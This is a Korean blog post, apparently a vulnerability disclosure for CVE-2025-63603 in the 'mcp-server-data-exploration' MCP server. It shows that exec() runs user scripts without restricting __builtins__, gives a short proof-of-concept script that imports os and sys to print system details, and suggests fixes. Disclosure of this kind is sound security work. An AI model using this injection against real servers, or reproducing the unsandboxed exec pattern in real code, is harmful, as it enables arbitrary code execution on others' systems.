---
title: CVE-2025-63603
#author: P0LESTAR
date: 2025-11-18 00:01:01 +0800
categories: [CVE]
tags: [CVE, MCP취약점]
#pin: true
sitemap:
  changefreq: monthly
  priority: 0.5
---

> 위 CVE는 K-Shield Jr. 프로젝트에서 발견한 취약점입니다.
{: .prompt-info }

## URL
reading-plus-ai 사의 'mcp-server-data-exploration' 에서 발견한 취약점입니다.

<https://github.com/reading-plus-ai/mcp-server-data-exploration>

<https://github.com/reading-plus-ai/mcp-server-data-exploration/issues/12>

## Explain
이 MCP 서버는 데이터 탐색을 위해 설계된 MCP 서버입니다.

'src/mcp_server_ds/server.py'에 사용자가 입력한 파이썬 스크립트를 실행하는 ScriptRunner 클래스가 있습니다.

이 클래스는 Cmd Injection을 방지하기 위해 safe_eval() 메소드를 정의했습니다.

```py
def safe_eval(self, script: str, save_to_memory: Optional[List[str]] = None):
        """safely run a script, return the result if valid, otherwise return the error message"""
        # first extract dataframes from the self.data
        local_dict = {
            **{df_name: df for df_name, df in self.data.items()},
        }
        # execute the script and return the result and if there is error, return the error message
        try:
            stdout_capture = StringIO()
            old_stdout = sys.stdout
            sys.stdout = stdout_capture
            self.notes.append(f"Running script: \n{script}")
            # pylint: disable=exec-used
            exec(script, \
                {'pd': pd, 'np': np, 'scipy': scipy, 'sklearn': sklearn, 'statsmodels': sm}, \
                local_dict)
            std_out_script = stdout_capture.getvalue()
        except Exception as e:
            raise McpError(INTERNAL_ERROR, f"Error running script: {str(e)}") from e

      ...
```

## vulnerability

exec함수의 두 번째, 세 번째 인자를 통해 global, local 딕셔너리를 제한하여 Cmd Injection을 방지하려했습니다.

하지만 [파이썬 공식 문서](https://docs.python.org/3/library/functions.html#exec)를 확인한 결과:

  두 번째 인자에 __builtins__을 명시하지 않으면 자동으로 파이썬 내장 모듈이 삽입됨을 알 수 있었습니다.

>즉 스크립트에 **import**, **exec** 같은 파이썬 내장 함수가 들어가도 에러가 발생하지 않고 실행될 수 있습니다.
{: .prompt-warning }

>If the globals dictionary does not contain a value for the key `__builtins__`, a reference to the dictionary of the built-in module builtins is inserted under that key. That way you can control what builtins are available to the executed code by inserting your own `__builtins__` dictionary into globals before passing it to exec().

## PoC
import모듈로 sys, os 등을 불러와 쉽게 OS cmd injection이 가능합니다.

```py
print("=== Command Injection PoC - System Information ===")
import sys, os, platform, getpass
print(f"Python Version: {sys.version}")
print(f"Operating System: {platform.system()} {platform.release()}")
print(f"Current User: {getpass.getuser()}")
print(f"Working Directory: {os.getcwd()}")
```

![Desktop View](https://private-user-images.githubusercontent.com/132473028/494939932-f054be7d-56c8-418d-b72a-5e58c6d7755a.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NjM4ODI0OTQsIm5iZiI6MTc2Mzg4MjE5NCwicGF0aCI6Ii8xMzI0NzMwMjgvNDk0OTM5OTMyLWYwNTRiZTdkLTU2YzgtNDE4ZC1iNzJhLTVlNThjNmQ3NzU1YS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUxMTIzJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MTEyM1QwNzE2MzRaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0zZDY2NDAwODYxYWE2OGQ0YzM5NmI3YmEzMTVjYThhMmY2ODZhNTk1NjU0MTRiOTMwZmZlZDYzODg3NWE2MDM1JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.7JMNbDlBuE9_W7SR3lRKn8FIDxGbuDxTY1Mpcmrgs_k)


### Remediation
1. 글로벌 딕셔너리에 `__builtins__`: {} 을 추가합니다.
2. 취약한 파이썬 함수인 `exec()`을 지양합니다.